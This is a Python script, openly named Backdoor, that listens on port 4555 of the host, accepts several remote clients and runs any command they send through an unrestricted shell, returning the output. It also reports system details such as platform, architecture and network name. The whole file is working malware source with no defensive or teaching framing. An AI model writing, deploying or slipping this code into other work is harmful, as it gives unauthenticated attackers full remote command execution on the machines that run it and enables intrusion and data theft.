import socket
import subprocess
import platform
import threading

class Backdoor:
    data_size = 2048
    custom_commands = ['info']

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Use a set to keep track of client connections
        self.clients = set()
        # Create a lock for synchronizing access to clients list
        self.lock = threading.Lock()

    def start(self):
        print(f"[+] Backdoor listening on {self.host}:{self.port}")
        self.socket.bind((self.host, self.port))
        # Allow up to 5 pending connections
        self.socket.listen(5)

    def run(self):
        self.start()
        while True:
            client_socket, addr = self.socket.accept()
            if (client_socket, addr) not in self.clients:
                self.clients.add((client_socket, addr))
                threading.Thread(target=self.handle_client, args=(client_socket, addr)).start()
                print(f"[+] Got a connection from {addr[0]} {addr[1]}")

    def handle_client(self, client_socket, addr):
        try:
            while True:
                data = client_socket.recv(self.data_size)
                if not data:
                    print(f"[-] Connection closed {addr[0]} {addr[1]}")
                    break
                cmd = data.decode('utf-8')
                if cmd.lower() == 'exit':
                    print(f"[-] Client at {addr[0]} {addr[1]} requested to exit")
                    break
                elif cmd in self.custom_commands:
                    if cmd == 'info':
                        client_socket.send(self.get_platform_info().encode('utf-8'))
                else:
                    output = self.run_command(cmd)
                    if output is not False:
                        client_socket.send(output.encode('utf-8'))
                    else:
                        msg = f"[-] Cannot execute the command {cmd}"
                        client_socket.send(msg.encode('utf-8'))
        except ConnectionResetError:
            print("Connection reset by peer.")
        except ConnectionAbortedError:
            print("Connection aborted.")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            client_socket.close()
            with self.lock:  # Acquire the lock before accessing the clients list
                if (client_socket, addr) in self.clients:
                    # Remove client if it exists in the list
                    self.clients.remove((client_socket, addr))
    def run_command(self, cmd):
        try:
            result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = result.communicate()
            if result.returncode == 0:
                return stdout
            else:
                return False
        except Exception as e:
            print(f"Error executing command: {e}")
            return False

    def get_platform_info(self):
        info = f"Platform: {platform.system()}\n"
        info += f"Architecture: {platform.architecture()[0]}\n"
        info += f"Machine type: {platform.machine()}\n"
        info += f"Network name: {platform.node()}\n"
        info += f"Processor Info: {platform.processor()}"
        return info

if __name__ == "__main__":
    host = socket.gethostbyname(socket.gethostname())
    port = 4555
    backdoor = Backdoor(host, port)
    backdoor.run()
